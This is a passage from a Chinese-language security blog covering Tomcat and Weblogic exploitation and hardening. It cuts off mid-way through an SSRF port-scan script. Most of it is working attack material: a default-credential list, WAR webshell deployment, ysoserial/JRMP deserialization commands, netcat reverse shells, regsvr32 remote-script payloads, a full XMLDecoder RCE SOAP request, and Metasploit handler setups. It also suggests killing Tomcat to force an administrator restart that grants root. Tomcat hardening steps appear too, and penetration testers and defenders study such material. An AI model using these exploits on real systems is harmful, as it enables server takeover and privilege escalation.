<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 &gt; set payload java/meterpreter/reverse_https msf5 &gt; set lhost 192.168.3.7</span><br><span class="line">msf5 &gt; set lport 443</span><br><span class="line">msf5 &gt; set exitonsession false msf5 &gt; exploit -j</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; pwd</span><br></pre></td></tr></table></figure>
<p>再通过默认 manager 管理控制台把自己 war 包 webshell 部署到目标机器上去</p>
<p>接着,本地启动 msf 执行监听,访问我们刚刚部署好的 war 包 webshell 的 url <a href="http://192.168.3.153:8080/options,随后便可看到" target="_blank" rel="noopener">http://192.168.3.153:8080/options,随后便可看到</a> meterpreter 被正常弹回,注意,此时弹回的权限仍然比较低,只是个 tomcat 服务用户权限</p>
<p>而后,开始今天的重点,首先,找到 catalina.out 文件所在的路径,默认会在/var/log/tomcat7 目录下,实战中如果实在找不到,不妨直接 find 下,而后上传 exp 脚本并赋予执行权限</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 &gt; set payload java/meterpreter/reverse_https msf5 &gt; set lhost 192.168.3.7</span><br><span class="line">msf5 &gt; set lport 443</span><br><span class="line">msf5 &gt; set exitonsession false msf5 &gt; exploit -j</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; pwd</span><br></pre></td></tr></table></figure>
<p>跟上 catalina.out 日志文件所在路径,开始执行 exp 脚本,此时只待目标重启 tomcat 服务,我们便可获取一个 root 权限的 shell,其实,是因为在 tmp 目录下下会生成一个带有 suid 权限的 tomcatrootsh 文件</p>
<p>Ok,此处我们就自己用 root 到目标机器上重启下 tomcat 服务,看看实际提权效果,实战中,完全可以不用等,想办法直接把 tomcat 进程干掉,逼着管理员过来重启 tomcat 就行</p>
<p>当目标管理员重启 tomcat 服务后,我们便立即有了一个 root 权限的 shell。</p>
<h3 id="6-Tomcat安全绕过漏洞-CVE-2018-1305"><a href="#6-Tomcat安全绕过漏洞-CVE-2018-1305" class="headerlink" title="6.    Tomcat安全绕过漏洞[CVE-2018-1305]"></a>6.    Tomcat安全绕过漏洞[CVE-2018-1305]</h3><p>mark:    <a href="http://www.nsfocus.com.cn/content/details_141_2703.html" target="_blank" rel="noopener">http://www.nsfocus.com.cn/content/details_141_2703.html</a></p>
<p><a href="https://xz.aliyun.com/t/2088" target="_blank" rel="noopener">https://xz.aliyun.com/t/2088</a></p>
<p>受影响版本</p>
<blockquote>
<p>Apache Tomcat &lt; 9.0.5<br>Apache Tomcat &lt; 8.5.28<br>Apache Tomcat &lt; 8.0.50<br>Apache Tomcat &lt; 7.0.85</p>
</blockquote>
<blockquote>
<p>条件：</p>
<p>业务系统部署在低版本的Tomcat中。<br>业务系统通过注解的方式定义安全约束。</p>
</blockquote>
<p>漏洞危害较高，但是利用条件困难，因此影响范围并不大。</p>
<h2 id="0x02-Tomcat服务安全加固"><a href="#0x02-Tomcat服务安全加固" class="headerlink" title="0x02 Tomcat服务安全加固"></a>0x02 Tomcat服务安全加固</h2><p>Tomcat服务默认启用了管理后台功能，使用该后台可直接上传 war 文件包对站点进行部署和管理。由于运维人员的疏忽，可能导致管理后台存在空口令或者弱口令的漏洞，使得黑客或者不法分子可以利用该漏洞直接上传 Webshell 脚本导致服务器沦陷。</p>
<p>通常 Tomcat 后台管理的 URL 地址为 <a href="http://ip:8080/manager/html/" target="_blank" rel="noopener">http://iP:8080/manager/html/</a>,</p>
<p>黑客通过猜解到的口令登录 Tomcat 管理后台后，可以上传 Webshell 脚本导致服务器被入侵。</p>
<h3 id="安全加固方案"><a href="#安全加固方案" class="headerlink" title="安全加固方案"></a>安全加固方案</h3><p>由于此类型漏洞可能对业务系统造成比较严重的危害，建议针对 Tomcat 管理后台进行以下安全加固配置。</p>
<h4 id="1-网络访问控制"><a href="#1-网络访问控制" class="headerlink" title="1. 网络访问控制"></a>1. 网络访问控制</h4><ul>
<li>如果的业务不需要使用 Tomcat 管理后台管理业务代码，建议使用<a href="https://help.aliyun.com/document_detail/25475.html" target="_blank" rel="noopener">安全组防火墙</a>功能对管理后台 URL 地址进行拦截，或直接将 Tomcat 部署目录中 webapps 文件夹中的 manager、host-manager 文件夹全部删除，并注释 Tomcat 目录中 conf 文件夹中的 tomcat-users.xml 文件中的所有代码。</li>
<li>如果的业务系统确实需要使用 Tomcat 管理后台进行业务代码的发布和管理，建议为 Tomcat 管理后台配置强口令，并修改默认 admin 用户，且密码长度不低于10位，必须包含大写字母、特殊符号、数字组合。</li>
</ul>
<h4 id="2-开启-Tomcat-的访问日志"><a href="#2-开启-Tomcat-的访问日志" class="headerlink" title="2. 开启 Tomcat 的访问日志"></a>2. 开启 Tomcat 的访问日志</h4><p>修改 conf/server.xml 文件，将下列代码取消注释：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">"org.apache.catalina.valves.AccessLogValve"</span> <span class="attr">directory</span>=<span class="string">"logs"</span>   <span class="attr">prefix</span>=<span class="string">"localhost_access_log."</span> <span class="attr">suffix</span>=<span class="string">".txt"</span> <span class="attr">pattern</span>=<span class="string">"common"</span> <span class="attr">resolveHosts</span>=<span class="string">"false"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>启用访问日志功能，重启 Tomcat 服务后，在 tomcat_home/logs 文件夹中就可以看到访问日志。</p>
<h4 id="3-Tomcat-默认帐号安全"><a href="#3-Tomcat-默认帐号安全" class="headerlink" title="3.Tomcat 默认帐号安全"></a>3.Tomcat 默认帐号安全</h4><p>修改 Tomcat 安装目录 conf 下的 tomcat-user.xml 文件，重新设置复杂口令并保存文件。重启 Tomcat 服务后，新口令即生效。</p>
<h4 id="4-修改默认访问端口"><a href="#4-修改默认访问端口" class="headerlink" title="4.修改默认访问端口"></a>4.修改默认访问端口</h4><p>修改 conf/server.xml 文件把默认的 8080 访问端口改成其它端口。</p>
<h4 id="5-重定向错误页面"><a href="#5-重定向错误页面" class="headerlink" title="5. 重定向错误页面"></a>5. 重定向错误页面</h4><p>修改访问 Tomcat 错误页面的返回信息，在 webapps\manger 目录中创建相应的401.html、404.htm、500.htm 文件，然后在 conf/web.xml 文件的最后一行之前添加下列代码：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span>      </span><br><span class="line">                           <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>401<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span>              </span><br><span class="line">                           <span class="tag">&lt;<span class="name">location</span>&gt;</span>/401.htm<span class="tag">&lt;/<span class="name">location</span>&gt;</span>          </span><br><span class="line">                   <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span>          </span><br><span class="line">                   <span class="tag">&lt;<span class="name">error-page</span>&gt;</span>    </span><br><span class="line">                           <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span>        </span><br><span class="line">                           <span class="tag">&lt;<span class="name">location</span>&gt;</span>/404.htm<span class="tag">&lt;/<span class="name">location</span>&gt;</span>          </span><br><span class="line">                   <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span>  </span><br><span class="line">                   <span class="tag">&lt;<span class="name">error-page</span>&gt;</span>    </span><br><span class="line">                           <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span>  </span><br><span class="line">                           <span class="tag">&lt;<span class="name">location</span>&gt;</span>/500.htm<span class="tag">&lt;/<span class="name">location</span>&gt;</span>      </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="6-禁止列出目录"><a href="#6-禁止列出目录" class="headerlink" title="6. 禁止列出目录"></a>6. 禁止列出目录</h4><p>防止直接访问目录时由于找不到默认页面，而列出目录下的文件的情况。</p>
<p>在 web.xml 文件中，将<code>&lt;param-name&gt;listings&lt;/param-name&gt;</code>改成<code>&lt;param-name&gt;false&lt;/param-name&gt;</code>。</p>
<h4 id="7-删除文档和示例程序"><a href="#7-删除文档和示例程序" class="headerlink" title="7. 删除文档和示例程序"></a>7. 删除文档和示例程序</h4><p>删除 webapps 目录下的 docs、examples、manager、ROOT、host-manager 文件夹。</p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web应用安全/">Web应用安全</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-中间件安全-Weblogic漏洞利用与安全加固"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/01/13/中间件安全-Weblogic漏洞利用与安全加固/">Weblogic漏洞利用与安全加固</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/01/13/中间件安全-Weblogic漏洞利用与安全加固/" class="article-date">
	  <time datetime="2018-01-13T15:53:56.000Z" itemprop="datePublished">2018-01-13</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>  WebLogic是美国bea公司出品的一个application server，确切的说是一个基于Javaee架构的中间件，纯java开发的，最新版本WebLogic Server 12cR2 (12.2.1.3)(截至发文前)是迄今为止发布的最卓越的BEA应用服务器。BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。完全遵循J2EE 1.4规范。</p>
<p>安装：<a href="https://blog.csdn.net/acmman/article/details/70093877" target="_blank" rel="noopener">https://blog.csdn.net/acmman/article/details/70093877</a></p>
<h2 id="0x01漏洞利用"><a href="#0x01漏洞利用" class="headerlink" title="0x01漏洞利用"></a>0x01漏洞利用</h2><h3 id="1、-默认管理控制台入口"><a href="#1、-默认管理控制台入口" class="headerlink" title="1、    默认管理控制台入口,"></a>1、    默认管理控制台入口,</h3><p>端口扫描 + web 搜索引擎 + 空间搜索引擎</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -Pn -v --open -p 80,7000-10000 192.168.3.195	考虑到精度,建议直接在目标 C 段跑,weblogic 默认端口为 7001,但通常情况下都会被目标管理员改掉,所以实战中端口最好稍微放大点</span><br></pre></td></tr></table></figure>
<p>如何精确识别 weblogic 版本是否在漏洞范围内,其实在控制台入口页面的左下角就有详细显示</p>
<h3 id="2、部署War包传Webshell"><a href="#2、部署War包传Webshell" class="headerlink" title="2、部署War包传Webshell"></a>2、部署War包传Webshell</h3><p>1)    常见 weblogic 入口弱口令列表如下,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">administrator:password </span><br><span class="line">weblogic:password </span><br><span class="line">weblogic:weblogic </span><br><span class="line">weblogic:weblogic1 </span><br><span class="line">weblogic:welcome1 </span><br><span class="line">weblogic:Oracle@123 </span><br><span class="line">system:weblogic </span><br><span class="line">system:password </span><br><span class="line">system:security </span><br><span class="line">system:system </span><br><span class="line">portaladmin:portaladmin</span><br><span class="line">wlcsystem:wlcsystem </span><br><span class="line">wlpisystem:wlpisystem </span><br><span class="line">admin:security</span><br><span class="line">joe:password</span><br><span class="line">guest:guest</span><br></pre></td></tr></table></figure>
<p>2)    当我们登录成功后,就可以立即尝试部署自己的 war 包 webshell 了,以下方法对于 weblogic 10.x - 12.x 版本几乎通用,具体如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">首先,登到 weblogic 控制台中,点击&apos; 锁定并编辑&apos; -&gt; &apos; 部署&apos;</span><br><span class="line"></span><br><span class="line">选择 &apos;安装&apos;</span><br><span class="line"></span><br><span class="line">选中自己事先准备好的 war 包 webshell [ 依然还是用我们之前文章中的那个 war 包 ],选择第一项 &apos;将部署上载到管理服务器&apos;,然后点击下一步</span><br><span class="line"></span><br><span class="line">根据提示可以看到, 此时我们的 war 包已经上传成功了,就在如下的目录中,继续...</span><br><span class="line"></span><br><span class="line">给该部署命名,此处为了防止出问题,建议保持默认</span><br><span class="line"></span><br><span class="line">点击&apos; 完成&apos;后,会提示 &apos;设置更新成功&apos;</span><br><span class="line"></span><br><span class="line">此时再次回到&apos;部署&apos;选项中,选中刚刚部署的 cmd 应用程序,点击&apos;启动&apos;服务,注意,此处一定要来自己手工启动服务,不然 shell 是部署不上的</span><br><span class="line"></span><br><span class="line">选择&apos; 是&apos;</span><br></pre></td></tr></table></figure>
<p>看到上面提示已启动部署,此时再用浏览器访问 http://[本地IP]:7001/cmd/cmd.jsp 就可以看到我们的 shell 了,如下</p>
<h3 id="3、-Weblogic远程代码执行漏洞-CVE-2018-2893"><a href="#3、-Weblogic远程代码执行漏洞-CVE-2018-2893" class="headerlink" title="3、   Weblogic远程代码执行漏洞[CVE-2018-2893]"></a>3、   Weblogic远程代码执行漏洞[CVE-2018-2893]</h3><p><strong><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></strong></p>
<blockquote>
<ul>
<li>Weblogic 10.3.6.0</li>
<li>Weblogic 12.1.3.0</li>
<li>Weblogic 12.2.1.2</li>
<li>Weblogic 12.2.1.3</li>
</ul>
</blockquote>
<p>漏洞验证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-2018-2893-test.py [目标IP] 7001</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-cve-2018-2893.jar JRMPClient4 &quot;[本地IP]:1099&quot; &gt; shell.cer</span><br><span class="line">java -cp ysoserial-cve-2018-2893.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 &quot;mshta.exe [本地IP] /options.hta&quot;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic.py [目标IP] 7001 shell.cer	在远程目标机器上执行该 payload</span><br></pre></td></tr></table></figure>
<h3 id="4、反序列化远程代码执行-CVE-2018-2628"><a href="#4、反序列化远程代码执行-CVE-2018-2628" class="headerlink" title="4、反序列化远程代码执行 [CVE-2018-2628]"></a>4、反序列化远程代码执行 [CVE-2018-2628]</h3><p>基本原理：由于 weblogic 对于 T3 协议发送的数据包没有过滤,注册一个 RMI 接口,通过 T3 协议建立连接,加载回来再一步步解包,利用 readObject 解析,从而造成了反序列化远程代码执行 </p>
<blockquote>
<p>影 响 版 本 :</p>
<p>Weblogic 10.3.6.0<br>Weblogic 12.1.3.0<br>Weblogic 12.2.1.2<br>Weblogic 12.2.1.3</p>
</blockquote>
<p><strong>漏洞验证</strong></p>
<p>依然是先快速验证下目标是否存在此漏洞 [ 注意,目标如果用的是非默认的 7001 端口,则需要自行到脚本中去稍微改下 ]:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 ' regsvr32 /s /n /u /i:http://192.168.3.14:8080/PhgWw1pQB6uBg.sct scrobj.dll'</span><br><span class="line"><span class="meta">#</span>win 平台反弹 meterpreter</span><br><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.3.233 110 &gt;/tmp/f'</span><br><span class="line"><span class="meta">#</span>linux反弹bash</span><br></pre></td></tr></table></figure>
<p>看到会话回来此处就可以立即 ctrl + c 了,很显然,既然可以弹 meterpreter,那也就一定可以弹 beacon。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2018-2628-exploit.py [目标IP] 7001 ysoserial.jar 192.168.3.14 1099 JRMPClient</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf &gt; set lhost 192.168.3.14</span><br><span class="line">msf &gt; set lport 53</span><br><span class="line">msf &gt; set rc4password klionsec msf &gt; exploit –j</span><br><span class="line">msf &gt; sessions -i 1</span><br><span class="line">meterpreter &gt; sysinfo meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
<h3 id="5、反序列化-CVE-2017-10271"><a href="#5、反序列化-CVE-2017-10271" class="headerlink" title="5、反序列化[CVE-2017-10271]"></a>5、反序列化[CVE-2017-10271]</h3><p>漏洞基本原理：即 wls wsat 模块的 RCE,究其底层其实还是 XMLDecoder 的反序列化漏洞 </p>
<p><strong>poc</strong>：<a href="https://github.com/hanc00l/weblogic_wls_wsat_rce" target="_blank" rel="noopener">https://github.com/hanc00l/weblogic_wls_wsat_rce</a> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic_wls_wsat_exp.py -t 172.16.80.131:7001</span><br></pre></td></tr></table></figure>
<p><strong>poc</strong>：</p>
<p><a href="http://www.bugsafe.cn/archives/136.html" target="_blank" rel="noopener">http://www.bugsafe.cn/archives/136.html</a></p>
<p>首先,快速验证目标是否存在此漏洞,浏览器访问 poc url : /wls-wsat/CoordinatorPortType 看到类似下面的返回则说明目标机器可能存在此漏洞<br>http://[目标IP] /wls-wsat/CoordinatorPortType    </p>
<p><img src="http://wfwewefw.yuxuni.cn/blog/181017/aLlLklAHla.png?imageslim" alt="mark"></p>
<p>而后,直接把下面的请求贴到 burpsuite 的 repeater 模块中进行请求,以此在目标机器上触发漏洞并执行我们的 payload,具体如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.3.195</span><br><span class="line">Accept-Encoding: identity Content-Length: 695</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3</span><br><span class="line">Connection: keep-alive Cache-Control: max-age=0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">&lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">&lt;void class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">&lt;array class="java.lang.String" length="3"&gt;</span><br><span class="line">&lt;void index="0"&gt;</span><br><span class="line">&lt;string&gt;cmd.exe&lt;/string&gt; #于执行 payload 代码的命令解释器,如果是在 linux 中,此处通常应该为/bin/bash</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="1"&gt;</span><br><span class="line">&lt;string&gt;/c&lt;/string&gt; #不交互,在 linux 下的选项写法为-c</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="2"&gt;</span><br><span class="line"><span class="meta">string&gt;</span>regsvr32 /s /n /u /i:http://192.168.3.14:8080/PhgWw1pQB6uBg.sct scrobj.dll&lt;/string&gt;	实际要执行的 payload 代码,直接远程下载执行,linux 中可以用 wget 或者 curl,然后管道交给 bash 去执行</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method="start"/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
<p>点击’go’ 之后便 meterpreter 已正常回连</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns </span><br><span class="line">msf &gt; set lhost 192.168.3.14</span><br><span class="line">msf &gt; set lport 53</span><br><span class="line">msf &gt; set rc4password klionsec msf &gt; exploit -j</span><br></pre></td></tr></table></figure>
<p><strong>msf模块</strong></p>
<p>exploit/multi/http/oracle_weblogic_wsat_deserialization_rce    </p>
<h3 id="6、-反序列化-CVE-2017-3248"><a href="#6、-反序列化-CVE-2017-3248" class="headerlink" title="6、    反序列化[CVE-2017-3248]"></a>6、    反序列化[CVE-2017-3248]</h3><blockquote>
<p>影 响 版 本 : Weblogic 10.3.6.0<br>Weblogic 12.1.3.0<br>Weblogic 12.2.1.0<br>Weblogic 12.2.1.1</p>
</blockquote>
<p>指定目标目标 weblogic 的 ip 端口和 JRMP 监听器的 ip [实战中肯定会直接放到自己的 vps 上搞] 端口[回连下载自己 payload 用的]</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit-CVE-2017-3248-bobsecq.py -t 192.168.3.195 -p 7001 --jip 192.168.3.14 --jport 1099 --cmd "regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kizans5Oa7F.sct scrobj.dll" --ysopath ysoserial.jar</span><br></pre></td></tr></table></figure>
<p>上面执行完以后,脚本会提示你启动 JRMP 监听,此时另起一个终端执行该监听,而后再回到上面去继续敲回车执行我们的 payload<br>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 ‘regsvr32 /s /n /u /i:<a href="http://192.168.3.14:8080/y8kiz" target="_blank" rel="noopener">http://192.168.3.14:8080/y8kiz</a> ans5Oa7F.sct scrobj.dll’    起监听,等待远程连接下载执行相应的 payload    </p>
<p>最后,便会看到目标机器的 meterpreter 正常被弹回</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kiz ans5Oa7F.sct scrobj.dll'	起监听,等待远程连接下载执行相应的 payload</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf &gt; set lhost 192.168.3.14</span><br><span class="line">msf &gt; set lport 53</span><br><span class="line">msf &gt; set rc4password klionsec</span><br><span class="line">msf &gt; exploit -j</span><br></pre></td></tr></table></figure>
<h3 id="7、-代码执行-CVE-2016-3510"><a href="#7、-代码执行-CVE-2016-3510" class="headerlink" title="7、    代码执行[CVE-2016-3510]"></a>7、    代码执行[CVE-2016-3510]</h3><p>poc:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic-CVE-2016-3510.py 192.168.3.195:7001 "regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kizans5Oa7F.sct scrobj.dll" --ysoserial-path ysoserial.jar</span><br></pre></td></tr></table></figure>
<h3 id="8、-代码执行-CVE-2015-4852"><a href="#8、-代码执行-CVE-2015-4852" class="headerlink" title="8、    代码执行[CVE-2015-4852]"></a>8、    代码执行[CVE-2015-4852]</h3><blockquote>
<p>受影响版本:<br>Oracle WebLogic Server, versions 10.3.6.0, 12.1.2.0, 12.1.3.0 and 12.2.1.0</p>
</blockquote>
<p>直接利用 t3 协议反弹目标机器的 cmd shell</p>
<blockquote>
<p>python weblogic.py -u 192.168.3.11 -p 7001 -os win -t reverse_shell –LHOST 192.168.3.14 –LPORT 8081    </p>
</blockquote>
<blockquote>
<p>nc -lvvp 8081    </p>
</blockquote>
<h3 id="9、Weblogic-ssrf"><a href="#9、Weblogic-ssrf" class="headerlink" title="9、Weblogic ssrf"></a>9、Weblogic ssrf</h3><p>Weblogic ssrf url 如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.195:7001/uddiexplorer/SearchPublicRegistries.jsp</span><br><span class="line">poc url: /uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp; txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
<p>探测内网开放端口:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ite_ip</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        final_ip = <span 